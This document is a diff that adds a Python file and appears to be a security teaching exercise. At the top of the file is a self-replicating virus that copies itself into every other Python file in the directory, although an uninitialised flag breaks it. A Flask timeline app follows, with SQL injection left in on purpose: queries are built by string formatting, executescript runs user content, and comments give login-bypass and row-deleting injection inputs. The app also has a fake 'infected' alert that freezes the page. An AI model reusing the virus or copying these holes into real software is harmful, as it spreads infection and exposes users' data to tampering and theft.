@@ -1,0 +1,394 @@
+#VIRUS SAYS HI!
+import sys
+import glob
+
+virus_code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines:
+    if line.strip() == "#VIRUS SAYS HI!":
+        in_virus_code = True
+    if in_virus_code:
+        virus_code.append(line)
+    if line.strip() == "#END OF VIRUS":
+        break
+
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+
+    infected = False
+
+    for line in file_code:
+        if line.strip() == "#VIRUS SAYS HI!":
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+
+def malicious_code():
+    print("you have been infected HAHAHAHA !!!")
+#END OF VIRUS
+
+# -*- coding: utf-8 -*-
+import os
+import sqlite3
+
+from flask import Flask
+from flask import redirect
+from flask import request
+from flask import session
+from jinja2 import Template
+
+app = Flask(__name__)
+
+app.secret_key = 'schrodinger cat'
+
+DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')
+
+
+def connect_db():
+    return sqlite3.connect(DATABASE_PATH)
+
+
+def create_tables():
+    conn = connect_db()
+    cur = conn.cursor()
+    cur.execute('''
+            CREATE TABLE IF NOT EXISTS user(
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username VARCHAR(32),
+            password VARCHAR(32)
+            )''')
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS time_line(
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        content TEXT,
+        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
+        )''')
+    conn.commit()
+    conn.close()
+
+
+def init_data():
+    users = [
+        ('user1', '123456'),
+        ('user2', '123456')
+    ]
+    lines = [
+        (1, 'Hello'),
+        (1, 'World'),
+        (2, 'Im 2'),
+        (2, 'Hello 2')
+    ]
+    conn = connect_db()
+    cur = conn.cursor()
+    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
+    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
+    conn.commit()
+    conn.close()
+
+
+def init():
+    create_tables()
+    init_data()
+
+
+def get_user_from_username_and_password(username, password):
+    conn = connect_db()
+    cur = conn.cursor()
+    #username=username.replace("'","")  #SQL injection countermeasure
+    #username=username.replace('-','')  #SQL injection countermeasure
+    print(username)
+    cur.execute('SELECT id, username FROM `user` WHERE username=\'%s\' AND password=\'%s\'' % (username, password))
+    row = cur.fetchone()
+    conn.commit()
+    conn.close()
+    return {'id': row[0], 'username': row[1]} if row is not None else None
+    # SELECT id, username FROM `user` WHERE username='user1' OR '1'='1' AND password='123456'
+    # input example:   user1' OR 4=4;--
+    # SELECT id, username FROM `user` WHERE username='user1' OR 4=4;--' AND password='123456'
+
+def get_user_from_id(uid):
+    conn = connect_db()
+    cur = conn.cursor()
+    cur.execute('SELECT id, username FROM `user` WHERE id=%d' % uid)
+    row = cur.fetchone()
+    conn.commit()
+    conn.close()
+
+    return {'id': row[0], 'username': row[1]}
+
+
+def create_time_line(uid, content):
+    conn = connect_db()
+    cur = conn.cursor()
+    cur.executescript('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))   
+    # example input=   contoh data'); delete from time_line where ( content='World
+    #cur.execute('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))
+    row = cur.fetchone()
+    conn.commit()
+    conn.close()
+
+    return row
+
+
+def get_time_lines():
+    conn = connect_db()
+    cur = conn.cursor()
+    cur.execute('SELECT id, user_id, content FROM `time_line` ORDER BY id DESC')
+    rows = cur.fetchall()
+    conn.commit()
+    conn.close()
+
+    return map(lambda row: {'id': row[0], 'user_id': row[1], 'content': row[2]}, rows)
+
+
+def user_delete_time_line_of_id(uid, tid):
+    conn = connect_db()
+    cur = conn.cursor()
+    cur.execute('DELETE FROM `time_line` WHERE  user_id=%s AND id=%s' % (uid, tid))
+    conn.commit()
+    conn.close()
+
+
+def render_login_page():
+    return '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        form {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 300px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <form method="POST">
+        <input name="username" type="text" placeholder="Username" required />
+        <input name="password" type="password" placeholder="Password" required />
+        <input value="Login" type="submit" />
+    </form>
+</body>
+</html>
+    '''
+
+
+def render_home_page(uid):
+    user = get_user_from_id(uid)
+    time_lines = get_time_lines()
+    show_alert = session.pop('show_alert', False)
+    template = Template('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Timeline App</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h4 {
+            color: #4CAF50;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        form {
+            margin-bottom: 30px;
+        }
+        input[type="text"] {
+            width: 70%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            width: 25%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+            border-top: 2px solid #4CAF50;
+        }
+        li {
+            border-bottom: 1px solid #eee;
+            padding: 15px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        li:last-child {
+            border-bottom: none;
+        }
+        .content {
+            flex-grow: 1;
+        }
+        a {
+            color: #f44336;
+            text-decoration: none;
+            padding: 5px 10px;
+            border: 1px solid #f44336;
+            border-radius: 3px;
+        }
+        a:hover {
+            background-color: #f44336;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h4>Welcome, {{ user['username'] }}!</h4>
+        <form method="POST" action="/create_time_line">
+            <input type="text" name="content" placeholder="Add a new time line..." required />
+            <input type="submit" value="Submit" />
+        </form>
+        <ul>
+            {% for line in time_lines %}
+            <li>
+                <div class="content">{{ line['content'] }}</div>
+                {% if line['user_id'] == user['id'] %}
+                <a href="/delete/time_line/{{ line['id'] }}">Delete</a>
+                {% endif %}
+            </li>
+            {% endfor %}
+        </ul>
+    </div>
+{% if show_alert %}
+<script>
+alert("you have been infected HAHAHAHA !!!");
+document.body.style.pointerEvents = 'none';
+setTimeout(function(){
+    document.body.style.pointerEvents = 'auto';
+}, 5000);
+</script>
+{% endif %}
+</body>
+</html>
+    ''')
+    return template.render(user=user, time_lines=time_lines, show_alert=show_alert)
+
+@app.route('/init')
+def init_page():
+    init()
+    return redirect('/')
+# access in web: http://127.0.0.1:5000/init
+@app.route('/')
+def index():
+    if 'uid' in session:
+        return render_home_page(session['uid'])
+    return redirect('/login')
+
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'GET':
+        return render_login_page()
+    elif request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        user = get_user_from_username_and_password(username, password)
+        if user is not None:
+            session['uid'] = user['id']
+            return redirect('/')
+        else:
+            return redirect('/login')
+
+
+@app.route('/create_time_line', methods=['POST'])
+def time_line():
+    if 'uid' in session:
+        # create_time_line(uid, request.form['content'])  # Commented out to not add to database
+        session['show_alert'] = True
+    return redirect('/')
+
+
+@app.route('/delete/time_line/<tid>')
+def delete_time_line(tid):
+    if 'uid' in session:
+        user_delete_time_line_of_id(session['uid'], tid)
+    return redirect('/')
+
+
+@app.route('/logout')
+def logout():
+    if 'uid' in session:
+        session.pop('uid')
+    return redirect('/login')
+
+
+if __name__ == '__main__':
+    init()
+    app.run(debug=True)
